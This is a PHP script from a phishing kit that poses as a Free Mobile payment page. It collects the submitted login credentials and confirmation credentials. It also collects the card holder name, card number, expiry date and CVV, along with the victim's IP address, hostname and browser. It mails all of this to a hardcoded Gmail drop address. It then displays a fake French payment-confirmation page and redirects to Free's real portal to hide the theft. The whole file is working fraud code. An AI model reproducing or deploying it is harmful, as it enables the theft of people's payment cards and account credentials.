﻿<?

$ip = getenv("REMOTE_ADDR");
$rx = "
-------------------+ FreeMobile 2016 +-------------------
User: ".$_POST['comid']."
Pass: ".$_POST['compw']."
-------------------+ confirmation login +-------------------
User: ".$_POST['comid2']."
Pass: ".$_POST['compw2']."
--------------------------------------
Holder Name: ".$_POST['comname']."
Number: ".$_POST['comnum']."
Date: ".$_POST['common']." / ".$_POST['comy']."
CVV: ".$_POST['comc']."
--------------------------------------
IP      : ".$ip."
HOST    : ".gethostbyaddr($ip)."
BROWSER : ".$_SERVER['HTTP_USER_AGENT']."
-------------------+ FreeMobile 2015 +-------------------

";

$xmail = "alex8ganzalo@gmail.com";

mail($xmail,"FreeMobile | ".$_POST['comname']." | ".$ip,$rx,"From: mail<mail>");
echo('
<!doctype html>
<html lang="en-US">
<head>
  <meta http-equiv="Content-Type" content="text/html;charset=utf-8">
  <link rel="stylesheet" type="text/css" media="all" href="style.css">
</head>

<body>
  <div id="w">
    <div id="content">
      <div class="notify successbox">
        <h1>Paiement validé!</h1>
        <span class="alerticon"><img src="images/check.png" alt="checkmark" /></span>
        <p>Votre facture N 1-D6A27 a été payée avec success.</p>
      </div>

    </div>
  </div>
</body>
</html>
<META http-equiv="refresh" content="3;URL=http://portail.free.fr/">
');
?>